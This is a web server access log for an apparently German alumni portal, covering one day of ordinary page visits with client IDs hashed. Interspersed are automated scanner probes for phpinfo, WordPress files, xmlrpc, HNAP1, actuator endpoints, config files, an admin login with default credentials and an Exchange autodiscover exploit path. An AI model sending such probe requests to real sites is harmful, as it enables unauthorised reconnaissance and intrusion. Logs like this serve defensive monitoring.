1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-30 10:12:06;;/phpinfo.php;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-30 10:12:10;;/phpinfo.php;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-30 10:12:12;;/info/;GET;404
1d4a6f377ba68d98baf84206970f49b639bca3f5b65f970ac0ae9766e5a84222;2025-11-30 10:12:12;;/geoserver/web/;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-30 10:12:16;;/info/;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-30 10:12:21;;/test;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-30 10:12:23;;/test;GET;404
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-30 10:19:35;/personen/alumni/schule/5503;/personen/alumni/schule/59043;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 10:20:59;/personen/alumni/schule/5503;/personen/alumni/schule/40745;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-30 10:22:28;/personen/alumni/details/olaf-schaeffer;/personen/alumni/details/olaf-schaeffer;GET;200
27332f6034214e79adf34fe891cf7dab739361371ca58dbb9f4ddebab5a032a0;2025-11-30 10:22:33;;/personen;GET;200
15a77adf4d87dc11e91cae0e1d5ef2ace98110b3822550c8c75beeddc8c3602c;2025-11-30 10:22:48;;/aktuelles/stellenangebote;GET;200
67189deb2a73e4254a1aaf4d9c38eefb807f518964f5ec6675069f42b4bc0fe6;2025-11-30 10:23:03;;/themen/details/der-start-ins-studium;GET;200
f3bf9d3954c9872387ea504efab533bc4ceb0d3d2797fff0797bff6015fcc5e4;2025-11-30 10:23:19;;/themen/details/abschied-aus-moabit;GET;200
27332f6034214e79adf34fe891cf7dab739361371ca58dbb9f4ddebab5a032a0;2025-11-30 10:23:34;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
10e54bc83aaa02def5a85ee42fe7d9b6203a9b6e7d9c0c7fafc3e0b91e79b101;2025-11-30 10:23:39;/;/;GET;200
7beab24c308120341f698ac436b5efe29a298825e09c85b43a0a69b65444eced;2025-11-30 10:23:49;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
925e5be256eb612e4c492898378712e7fc8e78900fe663cfe1364e9419c03a9d;2025-11-30 10:24:05;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
14344eabfdaa0af09eadfea89fd357f5c34ebfaf9f1bd631f7a1484013fd6356;2025-11-30 10:24:28;;/;GET;200
dd7b75a5cdfac6a6eedab8344c144956b22af0c9212c5fc6967ccce17508e531;2025-11-30 10:25:08;;/media/cache/avatar_sm/images/user/20.jpeg;GET;404
1d683395a12b937c707c15a095a73adfe2f41ee3d2d8799b20191c779bbf3937;2025-11-30 10:25:08;;/sitemap.xml;GET;200
3f1daae1a4e9c517ed8ef93173932473f6eebe8d0183ad8c4b4e2e8bdbd18229;2025-11-30 10:35:20;;/;GET;200
2153832cd87a7c2bede2290b67e8b5b932279e141c3447874d55605a57f6c100;2025-11-30 10:44:11;;/autodiscover/autodiscover.json?@zdi/Powershell;GET;404
007ce04e51f00afe0c01d7ebc534f1ace62376b20f932b156b7147a7bd6eb6e3;2025-11-30 10:55:56;;/themen/details/der-start-ins-studium;GET;200
5270a16d7888b13c2459a59d3e6cb5ff017fbfa2df67c0519ef9c31b907a76fe;2025-11-30 11:02:55;;/personen/alumni/schule/5506;GET;200
6c25216039fe6eb310922ed4754067f62fba1b9bfecc3c811b64d951f17c15a2;2025-11-30 11:13:36;/;/;GET;200
05f63f0e1e1153fa7c5419f0c7043132b3e6c6abd057f81fd7b7952ce49b9eb9;2025-11-30 11:18:10;;/;GET;200
ea434a6cbff4843e80eaf52eb5ef05305d5b2c7ef5e635bb50cbb597dab5df83;2025-11-30 11:18:23;;/;GET;200
f1b9231857b0d3585bb64cb847cc999d70e12bb0672fd9bedbf58229f28b860a;2025-11-30 11:20:53;;/themen?category=kultur;GET;200
2e5524b039843f15c3474aeac0be0ac76fd5d063417939cb41071513ba9d26ac;2025-11-30 11:27:51;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-30 11:31:38;;/?XDEBUG_SESSION_START=phpstorm;GET;200
e8b3eefc24fd73bd60d872b5caa2c3a26caa3d4066ca09240104eeecc5a7b138;2025-11-30 11:33:00;/;/;GET;200
94820928a698b96f44fc384f5a08a3f72e9766c0fdf9c0bea9e7d56f97846962;2025-11-30 11:39:48;;/personen/alumni/schule/190627;GET;200
3c9e99393cb928b32711f81e2f04bc81ab32b2c517b3161e4eb8dc50eb774da4;2025-11-30 11:41:44;;/;GET;200
11b9c12ee2382a7db1bc816b512f200420de4f836530fddcb2104ad6be11ac7c;2025-11-30 11:45:58;/;/;GET;200
512f29edf16f6be7febe2a2e14a32f291b21f4325cc0aa3986dcff60210bf817;2025-11-30 11:53:34;;/themen/details/was-kommt-nach-dem-abitur;GET;200
110a296d6273f2229d22716bb45e5a1f0574bb29dd1d2728b90a2ad8e1ed36c7;2025-11-30 11:56:52;/;/;GET;200
1d683395a12b937c707c15a095a73adfe2f41ee3d2d8799b20191c779bbf3937;2025-11-30 11:56:57;/sitemap.xml;/sitemap.xml;GET;200
108c72c7806537a0b351f828069f94baadec47b4f2999020cbda68ab739da8a1;2025-11-30 12:06:41;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
2e5d7ca58a6dafe954ed0008b232a6d174b3b63b19f01e9e2e7e4609b2da3a9d;2025-11-30 12:06:47;;/gruppen/hobby/abschlussfest;GET;302
0f8c88a14efbdb28bd5e766591bd54330de0e3aa960ce251ac2a2dbbe34b7df0;2025-11-30 12:06:48;;/gruppen/hobby/theater-und-schauspiel;GET;302
02b9246dee856d49075b7f0dad883fd07f0db3c0d122294c6075547a8b3a7f41;2025-11-30 12:06:54;;/themen/details/david-gegen-goliath;GET;200
b2685eb00605d116d3155e33149e176a80507b0a0820205fa870c1b6a4d5b21d;2025-11-30 12:16:23;/;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 12:18:04;/gruppen/hobby/grafikdesign;/gruppen/hobby/podcasting;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 12:18:04;/gruppen/hobby/grafikdesign;/gruppen;GET;200
e3cc5c545171844cc444985807ef2fcaa439e6c445cb915ec7df022135b6f343;2025-11-30 12:18:08;;/;GET;200
e3cc5c545171844cc444985807ef2fcaa439e6c445cb915ec7df022135b6f343;2025-11-30 12:18:09;;/odinhttpcall1764501488;GET;404
e3cc5c545171844cc444985807ef2fcaa439e6c445cb915ec7df022135b6f343;2025-11-30 12:18:09;;/HNAP1;GET;404
e3cc5c545171844cc444985807ef2fcaa439e6c445cb915ec7df022135b6f343;2025-11-30 12:18:09;;/evox/about;GET;404
e3cc5c545171844cc444985807ef2fcaa439e6c445cb915ec7df022135b6f343;2025-11-30 12:18:09;;/;GET;200
e3cc5c545171844cc444985807ef2fcaa439e6c445cb915ec7df022135b6f343;2025-11-30 12:18:09;;/;GET;200
0ace16d7abb6da5e5bc0ad1e05fad15768d7a7b2ae3f2d1365a6cdd88ae44966;2025-11-30 12:18:09;;/;GET;200
304970c76600f6feb29f7d04063431387af3c187fecfa621aa74e697e4f1c364;2025-11-30 12:18:10;;/;GET;200
a343168489f51882b60db1706456df37b4ec1056c3e43aa20c1aaf93ec0c3179;2025-11-30 12:24:24;;/ndp/adminlogin.php?Username=tac&Password=tac&Submit=Login&SsoVendor=&SsoIdToken=;GET;404
c32095dbf88e168edfafb04fa70765a19505724e441fa99c23e1595ebd7eb445;2025-11-30 12:24:50;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
a343168489f51882b60db1706456df37b4ec1056c3e43aa20c1aaf93ec0c3179;2025-11-30 12:26:28;;/ndp/adminlogin.php?Username=tac&Password=tac&Submit=Login&SsoVendor=&SsoIdToken=;GET;404
a714c4af0854398564625ab4a5f6d3b1149be2d6a862aed76c54c85484f96c1f;2025-11-30 12:28:20;;/actuator/health;GET;404
859149048fafdb8a09f9e61c28fe96ce69ae964182842719c739782774cc4c5d;2025-11-30 12:33:48;;/gruppen/hobby/physik;GET;302
ba86bca2c19de537138caa150d304fc6905c268c2b4ecd5c49bafb9414e9d518;2025-11-30 12:33:52;;/gruppen/hobby/chor;GET;302
572f6bba7b214b3f5f63e89a63bf25ca0d2e3030f167e0c9399725141c0a91f9;2025-11-30 12:33:56;;/gruppen/hobby/finanzbildung;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-30 12:41:55;/personen/alumni/schule/5503;/profile;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-30 12:41:56;/personen/alumni/schule/5503;/login;GET;200
8de4ddd7672a54a66eebd204c7a5271e8491caa3d60519a170e0057c4aa1ff5d;2025-11-30 12:45:33;;/;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-30 12:46:52;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
4d5e1c1c4f0447a4ec37c356977ea246da9a30312f39c9c22b8da47b0ce48971;2025-11-30 12:47:06;;/personen/alumni/schule/HS001;GET;200
ed349bcef0b3ec067ccc79965e82f63b4c87aec15106de9a2d821464bd7b548c;2025-11-30 12:50:00;;/personen/alumni/details/andie-jahnke;GET;200
dabefaf12b650d0010fe4bd2bacb5542b6fa2976cfcba2b2e8efe1a1ee51bed9;2025-11-30 12:50:30;/;/;GET;200
40be7163c8da0c36f2e3b5ebbe3e8edb2826869e6560d92aa483e90d6430ff74;2025-11-30 12:54:08;;/;GET;200
589c86fdbfa345f054406b3adc236077ccdc6629a445816802a85c52bed98c6c;2025-11-30 12:54:41;;/;GET;200
b7217d69e8d0115bb190e4e14c6e43253cdf077156dab449d4a7433c7996b23e;2025-11-30 12:57:01;;/admin/config.php;GET;404
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-30 12:58:19;;/actuator/gateway/routes;GET;404
7d3ab74a69f5a34a6dd0a31224e40edfbeac796657a02d5a8ddc627377e62ce8;2025-11-30 12:59:16;/;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 13:00:33;/gruppen/hobby/grafikdesign;/gruppen/hobby/philosophie;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 13:00:35;/gruppen/hobby/grafikdesign;/gruppen;GET;200
4aa8df7136d28c1387b1b1c53ad316b75cf6af392679af708effb0165394f5a1;2025-11-30 13:10:18;;/personen/alumni/schule/191073;GET;200
20170fe2a4fb586baecfaad898dd1fa741252163f4d6cc3680520723eb7f3631;2025-11-30 13:10:58;;/.well-known/traffic-advice;GET;404
8096669b65105024b6b4baa584346558785f46d26a9804225e9d6bcbde7198e7;2025-11-30 13:10:58;;/personen/alumni/details/thomas-matzig;GET;200
7e245226f47e4d724cdb77d037bb8bb64cd0c332e7d7a511630965c0d989097b;2025-11-30 13:11:04;;/;GET;200
7733266a889377fec7938821e313ff005753c6aad3194440e42f565b49161e2c;2025-11-30 13:11:06;;/gruppen/interesse/gesundheitswesen-und-pflege;GET;200
dc4fca78bed40450d8cf9bc1ffaeebdcc909c0e96e640ce74e57185b9de87d97;2025-11-30 13:15:13;;/;GET;200
770d0dc7cc24fd5d06ff6a1cb779bf7b9dc8574f58d2fe0080c09019aeb41914;2025-11-30 13:15:37;;/;GET;200
770d0dc7cc24fd5d06ff6a1cb779bf7b9dc8574f58d2fe0080c09019aeb41914;2025-11-30 13:15:37;;/odinhttpcall1764504937;GET;404
770d0dc7cc24fd5d06ff6a1cb779bf7b9dc8574f58d2fe0080c09019aeb41914;2025-11-30 13:15:37;;/HNAP1;GET;404
770d0dc7cc24fd5d06ff6a1cb779bf7b9dc8574f58d2fe0080c09019aeb41914;2025-11-30 13:15:37;;/evox/about;GET;404
770d0dc7cc24fd5d06ff6a1cb779bf7b9dc8574f58d2fe0080c09019aeb41914;2025-11-30 13:15:37;;/;GET;200
770d0dc7cc24fd5d06ff6a1cb779bf7b9dc8574f58d2fe0080c09019aeb41914;2025-11-30 13:15:37;;/;GET;200
18d9b5baf13bcecb318e9e8921401b900a7198a95c336970b18e2795d384c109;2025-11-30 13:15:37;;/;GET;200
dab6a0ee09a073b8cf90bb7120ed3c337246662b43cd6a59587b10086ae413e8;2025-11-30 13:15:39;;/;GET;200
24a47a83c7e4eb8fc5670b19da0e7d65a2d0ddbc9ae8f62c8065cef0110fb108;2025-11-30 13:22:03;;/;GET;200
c90980ca215a08e6628f442e68c278412262abd0b38bdfdacd05594ec2a6bb40;2025-11-30 13:25:46;;/;GET;200
d39f9ebb207ba5fa0fa7d362c0c941f6434d875a3dc182334ab2b3af762fcaf7;2025-11-30 13:32:24;;/personen/alumni/schule/5826;GET;200
bd34ec63947d73e00f0f626ad1af971d73002cd9f547a5b0663089d4aea886ec;2025-11-30 13:32:49;;/gruppen/interesse/teamarbeit;GET;200
303f83ba7f73ded0269403469ebbaf4e7579318eb5f693d1cae74974b8a10663;2025-11-30 13:32:52;;/gruppen/interesse/entrepreneurship;GET;200
39878d4c85ffcfa83ed7874b6bab5ed6892dab889f1f67e667b8a63b66a3a981;2025-11-30 13:34:41;;/;GET;200
fb2e82484314f079b117b7b70efbbab8f3aafb01fe135f123af17b36af69b890;2025-11-30 13:37:56;;/;GET;200
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:13;;/;GET;200
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:14;;//wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:14;;//xmlrpc.php?rsd;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:15;;/;GET;200
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:15;;//blog/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:15;;//web/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:15;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:16;;//website/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:16;;//wp/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:16;;//news/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:16;;//2018/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:16;;//2019/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:17;;//shop/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:17;;//wp1/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:17;;//test/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:17;;//media/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:17;;//wp2/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:18;;//site/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:18;;//cms/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:18;;//sito/wp-includes/wlwmanifest.xml;GET;404
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 13:47:09;/personen/alumni/schule/5503;/personen/alumni/schule/67945;GET;200
bef6848d851ec143f4d56cbca946a27f19ae05207808b73ed7fec3c9338f27ba;2025-11-30 13:55:19;;/themen/details/bucher-auf-dem-abstellgleis;GET;200
0410cc5726850d06e131fd54d0f61d2541468c5b204931badfb734151757bb74;2025-11-30 14:09:08;;/;GET;200
18e934c954535e3a67979443f450a58b3fc585de02541bb19d9909842542e5fc;2025-11-30 14:09:25;;/;GET;200
54e728aece7e345c898705d72640384e2d9f43d13523c8defa58a38e86cce44d;2025-11-30 14:09:26;;/;GET;200
8e98fcbac604bbc8026d014d5440087304acbcd5ae4896c635aa007f62f84dea;2025-11-30 14:10:31;;/personen/all/3;GET;200
49d85cf09c99ba0e31e1b09de0ea4b390f5d11561e27f5f38525588ae728820e;2025-11-30 14:10:35;;/gruppen/interesse/kundenbetreuung-und-beratung;GET;200
a6e464f602c4af968b07872cf2097b9aad68ac865bbc873f07fe389a12612dbd;2025-11-30 14:10:39;;/gruppen/interesse/selbststandigkeit;GET;200
aca2d427548012d36b73353bcf65aa95241c3fdc0eb57452a211f20dfb73ca46;2025-11-30 14:10:43;;/gruppen/hobby/geometrie;GET;302
878a3afd434c66e68595140ac9a65057519013dc0fc3c5bfd64a2e7c74b3e73c;2025-11-30 14:10:44;;/admin/config.php;GET;404
8386c982bbb3c5b7ae8e8480fa7322258ed2321e08c5bfad1672f45477b96d0d;2025-11-30 14:10:46;;/gruppen/hobby/skulptur;GET;302
c160af3b6117cdfb06ffed0eb5b47ee2f724eee1adaf60217bf6d3db202fdf67;2025-11-30 14:10:54;;/gruppen/hobby/elektronikbasteln;GET;302
29fb9ef46b9deff981d36fe1bee306b1a18e5c77ccec2b79e62403a0c4fe02b0;2025-11-30 14:11:47;;/themen/details/der-start-ins-studium;GET;200
c39033a4db53cb73bc2a62f06d408a13f3f9ac6ddeea8ee5e12ce2aeae10cda2;2025-11-30 14:12:15;;/themen/details/abschied-aus-moabit;GET;200
c39033a4db53cb73bc2a62f06d408a13f3f9ac6ddeea8ee5e12ce2aeae10cda2;2025-11-30 14:13:08;;/personen;GET;200
9545c81adbb78868bd26f153d9525fce2cc6ac856f25454ca71af7b9addc0c75;2025-11-30 14:13:17;;/aktuelles/stellenangebote;GET;200
c823138d25c729dfae88f53eba11f6c323cd2b57ad25218f5cf9fc1bd51fb79d;2025-11-30 14:13:32;;/themen/details/der-start-ins-studium;GET;200
2f38f1e734cc2f7e3efcc7e1aea7e2aa2eb2da170db57cc5a7a42abc5c334f4b;2025-11-30 14:15:02;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
9545c81adbb78868bd26f153d9525fce2cc6ac856f25454ca71af7b9addc0c75;2025-11-30 14:15:15;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-30 14:16:36;;/;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 14:18:46;/gruppen/hobby/grafikdesign;/gruppen/hobby/schreinern-und-bauen;GET;302
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 14:18:47;/gruppen/hobby/grafikdesign;/gruppen;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 14:36:45;/personen/alumni/details/jeanette-stephan;/personen/alumni/details/jeanette-stephan;GET;200
a9a5d728ca440e55c6d81eb856dddedb2945051e63d1b0fdaafed11a8b5bc6ae;2025-11-30 14:45:07;;/assets/jquery-file-upload/server/php/index.php?file=tf2rghf.jpg;GET;404
f0708e4212eb78741f5139e5aea95d8af046313a6759ab316537048907e601f2;2025-11-30 14:46:11;;/personen/alumni/schule/5506;GET;200
71bcc76daa2f29cbf39823aebef24e24a5fc2b19657749e09c176931e2cf9873;2025-11-30 14:46:36;;/;GET;200
737918069996e58d3b3836ae552886f7c3ed63e031ffd65adcfcca529d932799;2025-11-30 15:04:08;;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 15:04:34;/gruppen/hobby/grafikdesign;/gruppen/hobby/robotik;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 15:04:35;/gruppen/hobby/grafikdesign;/gruppen;GET;200
b595143d14e1973e27a8ef3bde100c9ea89e95a0231c6ddf8fc67b7659f080f4;2025-11-30 15:08:28;;/gruppen/hobby/statistik;GET;302
8f396eeda72715f30d5e26e0f497cd87ebdebb9a81593fde815467ed7d0ad014;2025-11-30 15:08:29;;/gruppen/hobby/philosophie;GET;302
de708e2683a64747b9ae7cf40f0795d6d1a189ef1f62ce8fccfe9b17aca2d647;2025-11-30 15:09:00;;/;GET;200
18428a84116f8cd8abbd84d94f57800636a899f4952a1dfab4c803302653ab21;2025-11-30 15:09:24;;/personen/alumni/schule/190627;GET;200
039b0e0e40e11331d6fa3194a8ba468b27db9da69e1c27068faf05aea7c35052;2025-11-30 15:14:19;;/;GET;200
a31306057511df7b34d97fd6c9e5a608d345b53bf166636bd319fb37f20d0b7f;2025-11-30 15:20:54;;/;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-30 15:22:15;/personen/all/2;/personen/all/4;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 15:23:38;/gruppen/hobby/grafikdesign;/gruppen/hobby/literaturanalyse;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 15:23:40;/gruppen/hobby/grafikdesign;/gruppen;GET;200
b59dc1479c01cfab70d976e5c09b1e3144f9fb8ee45614bde92fa15a86ed6788;2025-11-30 15:29:15;;/;GET;200
18465003bf08a02c148c944121bcfffef736ca74d9737b3448024c28f0896ed6;2025-11-30 15:31:53;;/personen/alumni/schule/HS001;GET;200
72cce75e53c77717dba548116856fa2182be72980313a5b938eacc7a56065ca4;2025-11-30 15:33:53;;/config.json;GET;404
8bcf13ba5c68c8fbc6e77ca46ea73503ba8b8b288324630cfb610d5ceb34532a;2025-11-30 15:36:23;;/;GET;200
516e53490dc20b8d7f7495601f8e48a9b774dc71f091f0f30ff41cb6358f0313;2025-11-30 15:44:12;;/;GET;200
ed179e1bac28674c703228cb82401e28cf5b1b1a6d7eccaf4311f3e0c4739641;2025-11-30 15:51:36;;/veranstaltungen/details/wartende-das-theaterstuck;GET;200
5ffa729dedb192e4e9a281356e44a382481aaf132f657968a94f9db8e9d9245a;2025-11-30 15:54:58;;/personen/alumni/schule/67945;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 15:56:46;/themen/details/bucher-auf-dem-abstellgleis;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-30 15:58:10;/personen/alumni/schule/5503;/personen/alumni/schule/59000;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 15:59:32;/personen/alumni/schule/5503;/personen/alumni/schule/610021;GET;200
4d5353815b37268c5b44cfa80e814a81d49b93cd18155f29be362b33eaba445c;2025-11-30 16:01:09;;/rechtliches/impressum;GET;200
d6916e0d3021e056e8c27691f38087d2a463edbaf58d1d06204bc0981df4d80a;2025-11-30 16:03:49;;/gruppen/hobby/einzelsportarten;GET;302
fd688db8337e8042f8f6b3f1d272a3be7713e126535c29500859847bf1d5f22b;2025-11-30 16:03:55;;/gruppen/hobby/astronomie;GET;302
ca2b29aee4021106773adb73e10841ca50fad8765a39c72a2eb3c63560be4f4a;2025-11-30 16:03:58;;/gruppen/hobby/diy-projekte;GET;302
909f96210057f8ed595075c7810c32d03b06da71fd6e1ecfc4b9bb77b90ea023;2025-11-30 16:04:44;;/.well-known/security.txt;GET;404
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-30 16:05:24;/;/;GET;200
01484fc6d37f8033c5d494337e6460e18fb4bdb359d8ef4e51969cf0332d0ff9;2025-11-30 16:05:58;;/;GET;200
669c2d69a2aee255d3b6518ef9cd2617cf0ae59acf234a33d83314693952a9a1;2025-11-30 16:08:32;;/;GET;200
bcd43ff0e1858744887e75cc7adc82ce997523f726b3630513091f47cf4a5634;2025-11-30 16:14:07;;/;GET;200
ee28776edf52e5daaa0842a1efaee536b8bd05cf0e58f6b6f314aee12a46cf1b;2025-11-30 16:17:38;;/;GET;200
ee28776edf52e5daaa0842a1efaee536b8bd05cf0e58f6b6f314aee12a46cf1b;2025-11-30 16:17:39;;/;GET;200
bcd43ff0e1858744887e75cc7adc82ce997523f726b3630513091f47cf4a5634;2025-11-30 16:18:14;;/;GET;200
bcd43ff0e1858744887e75cc7adc82ce997523f726b3630513091f47cf4a5634;2025-11-30 16:18:14;;/;GET;200
332093e1226e33c7a31ecfd2a211e4a44a065e8eb2294bb9a1afc2eeccad2e77;2025-11-30 16:19:37;;/;GET;200
734d0094bacbf4477f6eb13dd5cc481d053f81a377262476cdf519c96d8bd19b;2025-11-30 16:21:41;;/gruppen/hobby/yoga-und-meditation;GET;302
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-30 16:26:03;/themen/details/gemeinsam-stark-organisiert;/themen?category=community;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-30 16:27:26;/personen/alumni/schule/5503;/personen/alumni/schule/HS002;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-30 16:28:50;/personen/alumni/schule/5503;/personen/alumni/schule/5505;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-30 16:30:13;/gruppen/hobby/grafikdesign;/gruppen/interesse/kundenbetreuung-und-beratung;GET;200
9bbab444dc6b73cf80fb7cf1d3d1f6741810fb9f94c9a9a8c47c2c53cd9ca9b1;2025-11-30 16:32:40;;/personen/alumni/details/johanna-schley;GET;200
ed179e1bac28674c703228cb82401e28cf5b1b1a6d7eccaf4311f3e0c4739641;2025-11-30 16:39:33;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 16:40:27;/rechtliches/impressum;/personen/alumni/schule/4240404;GET;200
5af562281f4fd27634b64d853f2b6a801b41a1d5eed88526776b6129c8902146;2025-11-30 16:44:16;;/;GET;200
b0fc09974eff08269ccdac314c99d89cef8d182d0a7d9c810b2f04557a24f04d;2025-11-30 16:47:43;;/personen/alumni/schule/67933;GET;200
23c747c26d9f122e0e1654fcb547c3a7f078e0cb0c6f2f565175d0a1ab9d196d;2025-11-30 16:51:08;;/;GET;200
52763e6107afcf3170be2e730ed5ff9be573b3e09a993afa7f2aa84e23976d68;2025-11-30 16:55:55;;/wp-login.php;GET;404
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-30 16:59:21;/gruppen/hobby/grafikdesign;/gruppen/interesse/recht-und-verwaltung;GET;200
120ce0f3675bc5ed4743ecf6904eb049b2de508072abfe60fe3973d51138f67a;2025-11-30 17:01:58;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
857fce5b350a5019883b1a365a1dd939d9ec20140d8c347fe3555c2189602c75;2025-11-30 17:02:03;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
165376da2735949a3547f555fe21fa16ca4c9a243fb9f23f2549d888a7b4dac9;2025-11-30 17:07:29;/;/;GET;200
151f8bb1b69c67196d5341fdf42fbc855abd0a749b8657e8ce7178eccab9b593;2025-11-30 17:07:50;/aktuelles/meldungen/details/;/aktuelles/meldungen/details/;GET;301
159cab8419a2accd0a84944159fda91c362f5aee5055323b482f30e4cecc93b4;2025-11-30 17:07:53;/aktuelles/meldungen/details;/aktuelles/meldungen/details;GET;500
